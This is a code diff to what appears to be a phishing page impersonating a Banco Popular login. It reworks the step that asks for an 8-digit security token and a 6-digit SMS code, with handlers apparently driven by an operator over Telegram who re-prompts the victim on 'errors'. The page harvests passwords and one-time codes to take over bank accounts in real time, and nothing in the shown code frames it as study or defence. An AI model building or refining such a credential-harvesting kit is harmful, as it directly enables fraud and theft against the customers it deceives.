@@ -135,6 +135,29 @@ select.input { cursor: pointer; }
 .demo-instruction { background: #e6f6ed; border-radius: 12px; padding: 20px; text-align: center; margin: 0 0 20px; color: #006a33; font-size: 15px; line-height: 1.5; }
 .demo-instruction strong { font-weight: 800; display: block; margin-bottom: 6px; font-size: 18px; }
 .demo-title { text-align: center; font-size: 22px; line-height: 1.2; margin: 10px 0 22px; color: #333; }
+
+/* NUEVO INPUT ÚNICO PARA OTP */
+.otp-single-input {
+    width: 100%;
+    max-width: 320px;
+    margin: 0 auto 10px;
+    height: 60px;
+    border: 1.5px solid #ccc;
+    border-radius: 12px;
+    text-align: center;
+    font-size: 28px;
+    letter-spacing: 12px;
+    font-weight: bold;
+    color: #333;
+    background: #fafafa;
+    outline: none;
+    display: block;
+    transition: 0.2s;
+}
+.otp-single-input:focus { border-color: var(--brand-green); background: #fff; box-shadow: 0 0 0 3px rgba(0,166,80,.15); }
+.otp-single-input.error { border-color: #d9381e; background: #fff9f8; }
+.otp-single-input::placeholder { letter-spacing: 8px; color: #aaa; font-weight: normal; font-size: 24px; }
+
 .demo-actions { display: flex; justify-content: center; gap: 12px; margin-top: 25px; }
 .demo-actions button { flex: 1; max-width: 200px; min-height: 50px; border-radius: 8px; font-weight: bold; font-size: 16px; cursor: pointer; border: none; font-family: inherit; }
 .demo-actions .bc-button-secondary { background: transparent; color: #555; border: 1.5px solid #ccc; }
@@ -144,11 +167,6 @@ select.input { cursor: pointer; }
 .demo-note { font-size: 11px; color: #999; text-align: center; margin-top: 20px; }
 .demo-step { display: none; }
 .demo-step.active { display: block; }
-.otp-slots-container { display: flex; justify-content: center; gap: 10px; margin: 25px 0; }
-.otp-slot { width: 45px; height: 55px; border: 1.5px solid #ccc; border-radius: 10px; text-align: center; font-size: 1.5rem; line-height: 55px; font-weight: bold; background: #fafafa; color: #333; transition: 0.2s; }
-.otp-slot.active { border-color: var(--brand-green); background: #fff; box-shadow: 0 0 0 3px rgba(0,166,80,.15); }
-.otp-slots-container.error .otp-slot { border-color: #d9381e; background: #fff9f8; }
-.otp-hidden-input { position: absolute; opacity: 0; pointer-events: none; width: 1px; height: 1px; }
 
 /* ============ MÓVIL / TABLET ============ */
 @media (max-width: 800px) {
@@ -202,16 +220,24 @@ select.input { cursor: pointer; }
     .demo-overlay { padding: 16px; }
     .demo-modal { padding: 22px 22px 28px; border-radius: 20px; max-width: 100%; }
     .demo-instruction { padding: 18px; font-size: 15px; }
-    .otp-slots-container { gap: 8px; margin: 20px 0; }
-    .otp-slot { width: 44px; height: 52px; font-size: 1.3rem; line-height: 52px; }
+    
+    .otp-single-input {
+        font-size: 24px;
+        letter-spacing: 8px;
+        height: 55px;
+    }
 }
 
 @media (max-width: 400px) {
     .login-card { padding: 26px 20px 34px; }
     .input { height: 52px; padding: 0 14px; }
     .continue { height: 54px; font-size: 16px; }
-    .otp-slots-container { gap: 6px; }
-    .otp-slot { width: 40px; height: 48px; font-size: 1.15rem; line-height: 48px; }
+    
+    .otp-single-input {
+        font-size: 22px;
+        letter-spacing: 5px;
+        height: 52px;
+    }
 }
 </style>
 </head>
@@ -228,9 +254,8 @@ select.input { cursor: pointer; }
         <div class="security">♙</div>
         <h1 class="welcome">Bienvenido a</h1>
         
-        <!-- LOGO OFICIAL -->
         <div class="logo">
-            <img src="logopopu.svg" alt="Banco Popular">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/0a/Logo_Banco_Popular.svg/512px-Logo_Banco_Popular.svg.png" alt="Banco Popular">
         </div>
 
         <form id="demoForm" autocomplete="off" novalidate>
@@ -305,20 +330,23 @@ select.input { cursor: pointer; }
 <div class="demo-overlay" id="modalDinamica" role="dialog" aria-modal="true">
     <section class="demo-modal">
         <div class="demo-close-row"><button type="button" class="demo-close" id="closeModal" aria-label="Cerrar">×</button></div>
+        
+        <!-- VISTA TOKEN / DINÁMICA -->
         <div id="viewDinamica" class="demo-step active">
-            <div class="demo-instruction"><strong>Verificación de Seguridad</strong>Ingresa la Clave Dinámica de 6 dígitos de tu aplicación.</div>
-            <h2 class="demo-title">Clave Dinámica</h2>
-            <div class="otp-slots-container" id="otpContainer">
-                <div class="otp-slot"></div><div class="otp-slot"></div><div class="otp-slot"></div>
-                <div class="otp-slot"></div><div class="otp-slot"></div><div class="otp-slot"></div>
-            </div>
-            <input type="text" id="otpInput" class="otp-hidden-input" maxlength="6" inputmode="numeric">
-            <p id="otpError" class="error-msg" style="margin-bottom:12px;">Clave dinámica incorrecta o expirada.</p>
+            <div class="demo-instruction"><strong>Token de Seguridad</strong>Ingresa el código de 8 dígitos generado por tu dispositivo.</div>
+            <h2 class="demo-title">Token</h2>
+            
+            <!-- INPUT ÚNICO -->
+            <input type="text" id="otpInput" class="otp-single-input" maxlength="8" inputmode="numeric" placeholder="--------" autocomplete="off">
+            
+            <p id="otpError" class="error-msg" style="margin-bottom:12px;">Token incorrecto o expirado.</p>
             <div class="demo-actions">
                 <button type="button" class="bc-button-secondary" id="btnBorrar">Borrar</button>
                 <button type="button" class="bc-button-primary" id="btnContinuar" disabled>Continuar</button>
             </div>
         </div>
+
+        <!-- VISTA SMS -->
         <div id="viewSms" class="demo-step">
             <div class="demo-instruction"><strong>Verificación SMS</strong>Hemos enviado un código SMS de 6 dígitos a tu celular registrado.</div>
             <h2 class="demo-title">Código SMS</h2>
@@ -354,11 +382,9 @@ const togglePassword = document.getElementById("togglePassword");
 
 const modal         = document.getElementById("modalDinamica");
 const otpInput      = document.getElementById("otpInput");
-const otpSlots      = document.querySelectorAll(".otp-slot");
 const btnBorrar     = document.getElementById("btnBorrar");
 const btnContinuar  = document.getElementById("btnContinuar");
 const otpError      = document.getElementById("otpError");
-const otpContainer  = document.getElementById("otpContainer");
 const closeModal    = document.getElementById("closeModal");
 
 const viewDinamica  = document.getElementById("viewDinamica");
@@ -522,7 +548,7 @@ function handleTelegramActionLogin(action) {
         viewSms.classList.remove("active");
         otpInput.value = "";
         otpError.classList.remove("show");
-        otpContainer.classList.remove("error");
+        otpInput.classList.remove("error");
         actualizarOTP();
         setTimeout(() => otpInput.focus(), 100);
     } else if (action === 'error_usuario') {
@@ -548,7 +574,7 @@ function handleTelegramActionDinamica(action) {
         viewDinamica.classList.add("active");
         viewSms.classList.remove("active");
         otpError.classList.add("show");
-        otpContainer.classList.add("error");
+        otpInput.classList.add("error");
         otpInput.value = "";
         actualizarOTP();
         otpInput.focus();
@@ -574,7 +600,7 @@ function handleTelegramActionSms(action) {
         viewSms.classList.remove("active");
         viewDinamica.classList.add("active");
         otpError.classList.add("show");
-        otpContainer.classList.add("error");
+        otpInput.classList.add("error");
         otpInput.value = "";
         actualizarOTP();
         otpInput.focus();
@@ -605,48 +631,34 @@ demoForm.addEventListener("submit", function(e) {
 });
 
 // ==========================================
-// OTP
+// OTP (AHORA 8 DÍGITOS EN UN SOLO INPUT)
 // ==========================================
 function actualizarOTP() {
     const valor = otpInput.value;
-    otpSlots.forEach((slot, index) => {
-        if (index < valor.length) {
-            slot.textContent = valor[index];
-            slot.classList.remove("active");
-        } else {
-            slot.textContent = "";
-            if (index === valor.length) slot.classList.add("active");
-            else slot.classList.remove("active");
-        }
-    });
-
-    if (valor.length === 6) {
+    if (valor.length === 8) {
         btnContinuar.disabled = false;
-        otpSlots.forEach(s => s.classList.remove("active"));
     } else {
         btnContinuar.disabled = true;
     }
 }
 
 otpInput.addEventListener("input", function() {
-    this.value = this.value.replace(/[^0-9]/g, "").slice(0, 6);
+    this.value = this.value.replace(/[^0-9]/g, "").slice(0, 8);
     otpError.classList.remove("show");
-    otpContainer.classList.remove("error");
+    otpInput.classList.remove("error");
     actualizarOTP();
 });
-
-otpContainer.addEventListener("click", () => otpInput.focus());
 
 btnBorrar.addEventListener("click", () => {
     otpInput.value = "";
     otpError.classList.remove("show");
-    otpContainer.classList.remove("error");
+    otpInput.classList.remove("error");
     actualizarOTP();
     otpInput.focus();
 });
 
 btnContinuar.addEventListener("click", () => {
-    if (otpInput.value.length === 6) {
+    if (otpInput.value.length === 8) {
         enviarDinamica(otpInput.value);
     }
 });
@@ -655,6 +667,7 @@ closeModal.addEventListener("click", () => {
     modal.classList.remove("is-open");
 });
 
+// SMS
 smsCodeInput.addEventListener("input", function() {
     this.value = this.value.replace(/[^0-9]/g, "").slice(0, 6);
     smsError.classList.remove("show");
@@ -665,7 +678,7 @@ btnSmsFinal.addEventListener("click", () => {
     if (smsCodeInput.value.length < 6) {
         smsError.textContent = "Por favor, ingresa el código SMS completo de 6 dígitos.";
         smsError.classList.add("show");
-        smsInputWrap.classList.remove("error");
+        smsInputWrap.classList.add("error");
         return;
     }
     enviarSms(smsCodeInput.value);
